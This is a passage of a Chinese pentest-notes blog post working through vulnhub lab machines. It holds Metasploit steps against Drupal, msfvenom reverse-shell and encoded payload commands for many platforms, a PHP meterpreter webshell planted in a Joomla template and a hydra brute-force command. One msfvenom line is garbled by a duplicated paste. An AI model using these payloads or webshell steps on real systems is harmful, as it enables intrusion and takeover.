{"title":"常用工具的使用","uid":"e73809883b6a370bf3f1acefc7116657","slug":"tooluse(Commontools)","date":"2023-02-13T13:31:12.814Z","updated":"2023-08-06T08:00:47.219Z","comments":true,"path":"api/articles/tooluse(Commontools).json","keywords":null,"cover":"/img/27.jpg","content":"<p><code>记性不好记录一下</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"常用工具的使用\"><a href=\"#常用工具的使用\" class=\"headerlink\" title=\"常用工具的使用\"></a>常用工具的使用</h1><h2 id=\"1）msf\"><a href=\"#1）msf\" class=\"headerlink\" title=\"1）msf\"></a>1）msf</h2><h3 id=\"（1）msf基本使用\"><a href=\"#（1）msf基本使用\" class=\"headerlink\" title=\"（1）msf基本使用\"></a>（1）msf基本使用</h3><p><code>一个漏洞利用框架,对计算机软件漏洞进行攻击</code></p>\n<p><strong>这里以vulnhub dc1为例</strong></p>\n<p>终端输入<code>msfconsole</code>，进入msf界面，或者菜单也可以打开</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220830094506049.png\" alt=\"image-20220830094506049\"></p>\n<figure class=\"highlight openscad\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs openscad\">输入<span class=\"hljs-built_in\">search</span> drupal，找一下有没有drupal可以利用的脚本<br><span class=\"hljs-comment\">/*对于其他命令，可以用help查询*/</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830094939297.png\" alt=\"image-20220830094939297\"></p>\n<p>这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以</p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs actionscript\">输入<span class=\"hljs-keyword\">use</span> <span class=\"hljs-number\">1</span>，进入编号<span class=\"hljs-number\">1</span>脚本的运行环境<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830095106784.png\" alt=\"image-20220830095106784\"></p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">输入<span class=\"hljs-keyword\">show</span> <span class=\"hljs-keyword\">options</span>,查看脚本运行的所需要配置的项目<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830105519336.png\" alt=\"image-20220830105519336\"></p>\n<p><code>Required</code>是要求填的，yes是必填项，no是非必填项</p>\n<p>这里的<code>RHOSTS</code>没有填，这里是要求填入<code>target hosts</code>也就是目标地址，也就是我们靶机的地址</p>\n<figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gams\">输入<span class=\"hljs-keyword\">set</span> RHOSTS <span class=\"hljs-comment\">192.168.133.136</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110143969.png\" alt=\"image-20220830110143969\"></p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\">再输入<span class=\"hljs-built_in\">run</span>，运行脚本<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110303594.png\" alt=\"image-20220830110303594\"></p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gauss\">输入<span class=\"hljs-built_in\">shell</span>，进入<span class=\"hljs-built_in\">shell</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110551273.png\" alt=\"image-20220830110551273\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">输入<span class=\"hljs-built_in\">whoami</span>，查看当前的权限<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110648417.png\" alt=\"image-20220830110648417\"></p>\n<p>发现是个低权限的账号</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">输入<span class=\"hljs-built_in\">ls</span>，可以查看到当前的目录文件<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110825217.png\" alt=\"image-20220830110825217\"></p>\n<p>但是一堆东西挤在一起，还是有些不太方便</p>\n<p><strong>输入下方指令，利用python进入交互式shell【固定姿势，要记住】</strong></p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ada\">python -c <span class=\"hljs-symbol\">&#x27;import</span> pty; pty.spawn(<span class=\"hljs-string\">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110907408.png\" alt=\"image-20220830110907408\"></p>\n<h3 id=\"（2）msf后门生成模块\"><a href=\"#（2）msf后门生成模块\" class=\"headerlink\" title=\"（2）msf后门生成模块\"></a>（2）msf后门生成模块</h3><h4 id=\"普通生成\"><a href=\"#普通生成\" class=\"headerlink\" title=\"普通生成\"></a>普通生成</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">msfvenom -<span class=\"hljs-selector-tag\">p</span> 有效载荷 -f 输出格式 -o 输出文件<br><br>msfvenom -<span class=\"hljs-selector-tag\">p</span> windows/meterpreter/reverse_tcp -f exe -o payload<span class=\"hljs-selector-class\">.exe</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"编码生成\"><a href=\"#编码生成\" class=\"headerlink\" title=\"编码生成\"></a>编码生成</h4><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 <span class=\"hljs-attribute\">lhost</span>=攻击机IP <span class=\"hljs-attribute\">lport</span>=攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件<br><br>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class=\"hljs-attribute\">lhost</span>=192.168.1.1 <span class=\"hljs-attribute\">lport</span>=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"以DC-3举个例子\"><a href=\"#以DC-3举个例子\" class=\"headerlink\" title=\"*以DC-3举个例子\"></a>*以DC-3举个例子</h4><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">输入msfvenom -<span class=\"hljs-selector-tag\">p</span> php/meterpreter/reverse_tcp LHOST=kali的ip LPORT=<span class=\"hljs-number\">4444</span> -f raw &gt; shell<span class=\"hljs-selector-class\">.php</span><br><span class=\"hljs-comment\">//注意，LHOST是kali的ip</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903222910397.png\" alt=\"image-20220903222910397\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">输入<span class=\"hljs-built_in\">ls</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903144052531.png\" alt=\"image-20220903144052531\"></p>\n<p>发现目录下生成了 <code>shell.php</code></p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220903223007361.png\" alt=\"image-20220903223007361\"></p>\n<p>然后在网站新建一个php文件</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220903221140645.png\" alt=\"image-20220903221140645\"></p>\n<p>然后把木马内容导入进去</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220903223039265.png\" alt=\"image-20220903223039265\"></p>\n<p>然后保存一下</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220903221238918.png\" alt=\"image-20220903221238918\"></p>\n<p>然后试试能不能访问木马</p>\n<p>然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功</p>\n<p>因为我们文件是在<code>/templates/protostar/less/</code>下上传的，所以访问</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">133.139</span><span class=\"hljs-regexp\">/templates/</span>protostar<span class=\"hljs-regexp\">/less/</span><span class=\"hljs-number\">1</span>.php<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903221336853.png\" alt=\"image-20220903221336853\"></p>\n<p>看到&#x2F;*，看来是可以成功访问</p>\n<h5 id=\"msf利用木马\"><a href=\"#msf利用木马\" class=\"headerlink\" title=\"msf利用木马\"></a>msf利用木马</h5><p>然后用msf进行利用</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">先输入msfconsole，进入msf<br></code></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">然后输入<br>use exploit/multi/handler<br><br><span class=\"hljs-built_in\">set</span> payload php/meterpreter/reverse_tcp<br>进入我们利用msf制作的木马利用环境<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903220102252.png\" alt=\"image-20220903220102252\"></p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">输入<span class=\"hljs-keyword\">show</span> <span class=\"hljs-keyword\">options</span><br>看看需要填写什么<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903220250819.png\" alt=\"image-20220903220250819\"></p>\n<p>看到LHOST监听的ip没有填写</p>\n<figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gams\">输入<span class=\"hljs-keyword\">set</span> LHOST <span class=\"hljs-comment\">192.168.133.140</span> //<span class=\"hljs-comment\">kali</span>的<span class=\"hljs-comment\">ip</span><br></code></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\">输入<span class=\"hljs-built_in\">run</span>，运行，会卡住<br></code></pre></td></tr></table></figure>\n\n<p>这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">http</span>://<span class=\"hljs-number\">192.168.133.139</span>/templates/protostar/<span class=\"hljs-number\">1</span>.php<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903223414089.png\" alt=\"image-20220903223414089\"></p>\n<p>后面操作不赘述</p>\n<h4 id=\"msfvenom-—list-archs\"><a href=\"#msfvenom-—list-archs\" class=\"headerlink\" title=\"msfvenom —list archs\"></a>msfvenom —list archs</h4><p>#查看支持的系统架构</p>\n<figure class=\"highlight llvm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\">aarch<span class=\"hljs-number\">64</span><span class=\"hljs-punctuation\">,</span> armbe<span class=\"hljs-punctuation\">,</span> armle<span class=\"hljs-punctuation\">,</span> cbea<span class=\"hljs-punctuation\">,</span> cbea<span class=\"hljs-number\">64</span><span class=\"hljs-punctuation\">,</span> cmd<span class=\"hljs-punctuation\">,</span> dalvik<span class=\"hljs-punctuation\">,</span> firefox<span class=\"hljs-punctuation\">,</span> java<span class=\"hljs-punctuation\">,</span> mips<span class=\"hljs-punctuation\">,</span> mips<span class=\"hljs-number\">64</span><span class=\"hljs-punctuation\">,</span> mips<span class=\"hljs-number\">64</span>le<span class=\"hljs-punctuation\">,</span> mipsbe<span class=\"hljs-punctuation\">,</span> mipsle<span class=\"hljs-punctuation\">,</span> nodejs<span class=\"hljs-punctuation\">,</span> php<span class=\"hljs-punctuation\">,</span> ppc<span class=\"hljs-punctuation\">,</span> ppc<span class=\"hljs-number\">64</span><span class=\"hljs-punctuation\">,</span> ppc<span class=\"hljs-number\">64</span>le<span class=\"hljs-punctuation\">,</span> ppce<span class=\"hljs-number\">500</span>v<span class=\"hljs-number\">2</span><span class=\"hljs-punctuation\">,</span> python<span class=\"hljs-punctuation\">,</span> r<span class=\"hljs-punctuation\">,</span> ruby<span class=\"hljs-punctuation\">,</span> sparc<span class=\"hljs-punctuation\">,</span> sparc<span class=\"hljs-number\">64</span><span class=\"hljs-punctuation\">,</span> tty<span class=\"hljs-punctuation\">,</span> <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">64</span><span class=\"hljs-punctuation\">,</span> <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">86</span><span class=\"hljs-punctuation\">,</span> <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">86</span>_<span class=\"hljs-number\">64</span><span class=\"hljs-punctuation\">,</span> zarch<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"msfvenom-—list-platforms\"><a href=\"#msfvenom-—list-platforms\" class=\"headerlink\" title=\"msfvenom —list platforms\"></a>msfvenom —list platforms</h4><p>#查看支持系统平台</p>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mipsasm\">aix, <span class=\"hljs-keyword\">android, </span>apple_ios, <span class=\"hljs-keyword\">bsd, </span><span class=\"hljs-keyword\">bsdi, </span>cisco, firefox, freebsd, hardware, hpux, irix, <span class=\"hljs-keyword\">java, </span><span class=\"hljs-keyword\">javascript, </span><span class=\"hljs-keyword\">juniper, </span>linux, mainframe, <span class=\"hljs-keyword\">multi, </span>netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows<br></code></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs livecodeserver\">msfvenom -l payload <span class=\"hljs-comment\">#列出所有可用的payload</span><br><br>msfvenom -l formats <span class=\"hljs-comment\">#列出所有的输出格式</span><br><br>msfvenom -l <span class=\"hljs-built_in\">encrypt</span> <span class=\"hljs-comment\">#列出所有的加密方式</span><br><br>msfvenom -l encoders <span class=\"hljs-comment\">#列出所有的编码器</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"常见生成格式\"><a href=\"#常见生成格式\" class=\"headerlink\" title=\"常见生成格式\"></a>常见生成格式</h4><h5 id=\"1、-Windows\"><a href=\"#1、-Windows\" class=\"headerlink\" title=\"1、 Windows\"></a>1、 Windows</h5><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">msfvenom <span class=\"hljs-attr\">--platform</span> windows -<span class=\"hljs-selector-tag\">a</span> x86 -<span class=\"hljs-selector-tag\">p</span> windows/meterpreter/reverse_tcp -<span class=\"hljs-selector-tag\">i</span> <span class=\"hljs-number\">3</span> -e x86/shikata_ga_nai -f exe -o payload<span class=\"hljs-selector-class\">.exe</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"2、Linux\"><a href=\"#2、Linux\" class=\"headerlink\" title=\"2、Linux\"></a>2、Linux</h5><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">msfvenom <span class=\"hljs-attr\">--platform</span> linux -<span class=\"hljs-selector-tag\">a</span> x86 -<span class=\"hljs-selector-tag\">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload<span class=\"hljs-selector-class\">.elfxxxxxxxxxx</span> msfvenom <span class=\"hljs-attr\">--platform</span> linux -<span class=\"hljs-selector-tag\">a</span> x86 -<span class=\"hljs-selector-tag\">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf1<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"3、Mac\"><a href=\"#3、Mac\" class=\"headerlink\" title=\"3、Mac\"></a>3、Mac</h5><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">msfvenom <span class=\"hljs-attr\">--platform</span> osx -<span class=\"hljs-selector-tag\">a</span> x86 -<span class=\"hljs-selector-tag\">p</span> osx/x86/shell_reverse_tcp -f macho -o payload<span class=\"hljs-selector-class\">.macho</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"4、Android\"><a href=\"#4、Android\" class=\"headerlink\" title=\"4、Android\"></a>4、Android</h5><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">msfvenom -p android<span class=\"hljs-regexp\">/meterpreter/</span>reverse_tcp -o payload.apk<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"5、Aspx\"><a href=\"#5、Aspx\" class=\"headerlink\" title=\"5、Aspx\"></a>5、Aspx</h5><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">msfvenom <span class=\"hljs-attr\">--platform</span> windows-<span class=\"hljs-selector-tag\">p</span> windows/meterpreter/reverse_tcp -f aspx -o payload<span class=\"hljs-selector-class\">.aspx</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"6、JSP\"><a href=\"#6、JSP\" class=\"headerlink\" title=\"6、JSP\"></a>6、JSP</h5><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">msfvenom <span class=\"hljs-attr\">--platform</span> java -<span class=\"hljs-selector-tag\">p</span> java/jsp_shell_reverse_tcp -f raw -o payload<span class=\"hljs-selector-class\">.jsp</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"7、PHP\"><a href=\"#7、PHP\" class=\"headerlink\" title=\"7、PHP\"></a>7、PHP</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"8、BASH\"><a href=\"#8、BASH\" class=\"headerlink\" title=\"8、BASH\"></a>8、BASH</h5><figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dockerfile\">msfvenom -p <span class=\"hljs-keyword\">cmd</span><span class=\"language-bash\">/unix/reverse_bash -f raw -o shell.sh</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"9、Python\"><a href=\"#9、Python\" class=\"headerlink\" title=\"9、Python\"></a>9、Python</h5><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\">msfvenom -<span class=\"hljs-keyword\">p</span> <span class=\"hljs-keyword\">python</span>/meterpreter/reverse_tcp -<span class=\"hljs-keyword\">f</span> raw -<span class=\"hljs-keyword\">o</span> <span class=\"hljs-keyword\">shell</span>.<span class=\"hljs-keyword\">py</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Msfvenom常用命令参数\"><a href=\"#Msfvenom常用命令参数\" class=\"headerlink\" title=\"Msfvenom常用命令参数\"></a>Msfvenom常用命令参数</h4><figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs livecodeserver\">-l, <span class=\"hljs-comment\">--list &lt;type&gt; </span><br><span class=\"hljs-comment\"># 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等</span><br>-p, <span class=\"hljs-comment\">--payload &lt;payload&gt; </span><br><span class=\"hljs-comment\"># 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span><br><span class=\"hljs-comment\">--list-options </span><br><span class=\"hljs-comment\"># 列出--payload &lt;value&gt; 的标准，高级和规避选项</span><br>-f, <span class=\"hljs-comment\">--format &lt;format&gt; </span><br><span class=\"hljs-comment\"># 指定 Payload 的输出格式(使用 --list formats 列出)</span><br>-e, <span class=\"hljs-comment\">--encoder &lt;encoder&gt; </span><br><span class=\"hljs-comment\"># 指定使用的 Encoder (使用 --list encoders 列出)</span><br><span class=\"hljs-comment\">--sec-name &lt;value&gt; </span><br><span class=\"hljs-comment\"># 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串</span><br><span class=\"hljs-comment\">--smallest </span><br><span class=\"hljs-comment\"># 使用所有可用的编码器生成最小的payload</span><br><span class=\"hljs-comment\">--encrypt &lt;value&gt; </span><br><span class=\"hljs-comment\"># 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)</span><br><span class=\"hljs-comment\">--encrypt-key &lt;value&gt; </span><br><span class=\"hljs-comment\"># 用于加密的密钥</span><br><span class=\"hljs-comment\">--encrypt-iv &lt;value&gt; </span><br><span class=\"hljs-comment\"># 加密的初始化向量</span><br>-<span class=\"hljs-keyword\">a</span>, <span class=\"hljs-comment\">--arch &lt;arch&gt; </span><br><span class=\"hljs-comment\"># 指定目标系统架构(使用 --list archs 列出)</span><br><span class=\"hljs-comment\">--platform &lt;platform&gt; </span><br><span class=\"hljs-comment\"># 指定目标系统平台 (使用 --list platforms 列出)</span><br>-o, <span class=\"hljs-comment\">--out &lt;path&gt; </span><br><span class=\"hljs-comment\"># 保存payload文件</span><br>-b, <span class=\"hljs-comment\">--bad-chars &lt;list&gt; </span><br><span class=\"hljs-comment\"># 设置需要在 Payload 中避免出现的字符，如： &#x27;\\x00\\xff&#x27;</span><br>-n, <span class=\"hljs-comment\">--nopsled &lt;length&gt; </span><br><span class=\"hljs-comment\"># 指定 nop 在 payload 中的数量</span><br>-s, <span class=\"hljs-comment\">--space &lt;length&gt; </span><br><span class=\"hljs-comment\"># 设置未经编码的 Payload 的最大长度</span><br><span class=\"hljs-comment\">--encoder-space &lt;length&gt; </span><br><span class=\"hljs-comment\"># 编码后的 Payload 的最大长度</span><br>-i, <span class=\"hljs-comment\">--iterations &lt;count&gt; </span><br><span class=\"hljs-comment\"># 设置 Payload 的编码次数</span><br>-c, <span class=\"hljs-comment\">--add-code &lt;path&gt; </span><br><span class=\"hljs-comment\"># 指定包含一个额外的win32 shellcode文件</span><br>-x, <span class=\"hljs-comment\">--template &lt;path&gt; </span><br><span class=\"hljs-comment\"># 指定一个特定的可执行文件作为模板</span><br>-k, <span class=\"hljs-comment\">--keep </span><br><span class=\"hljs-comment\"># 保护模板程序的功能，注入的payload作为一个新的进程运行</span><br>-v, <span class=\"hljs-comment\">--var-name &lt;value&gt; </span><br><span class=\"hljs-comment\"># 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span><br>-t, <span class=\"hljs-comment\">--timeout &lt;second&gt; </span><br><span class=\"hljs-comment\"># 设置从STDIN读取payload的等待时间（默认为30,0为禁用）</span><br>-h, <span class=\"hljs-comment\">--help </span><br><span class=\"hljs-comment\"># 帮助</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"2）hydra\"><a href=\"#2）hydra\" class=\"headerlink\" title=\"2）hydra\"></a>2）hydra</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>hydra是一个自动化的爆破工具,暴力破解弱密码,是一个支持众多协议的爆破工具</code></p></blockquote>\n<h3 id=\"1-爆破用户密码\"><a href=\"#1-爆破用户密码\" class=\"headerlink\" title=\"1.爆破用户密码\"></a>1.爆破用户密码</h3><p><strong>这里以vulnhub dc1为例</strong></p>\n<p>用了<code>hydra</code>[海德拉]工具，对<code>flag4</code>用户进行爆破</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">hydra -l flag4 -<span class=\"hljs-selector-tag\">p</span> /usr/share/wordlists/rockyou<span class=\"hljs-selector-class\">.txt</span><span class=\"hljs-selector-class\">.gz</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">133.136</span> -vV -f<br><br><br>-l是指定用户或指定包含多个用户的文件，-<span class=\"hljs-selector-tag\">p</span>是指定密码或指定包含多个密码的文件，ssh就是<br>用户所在的网站<br><br>上面-<span 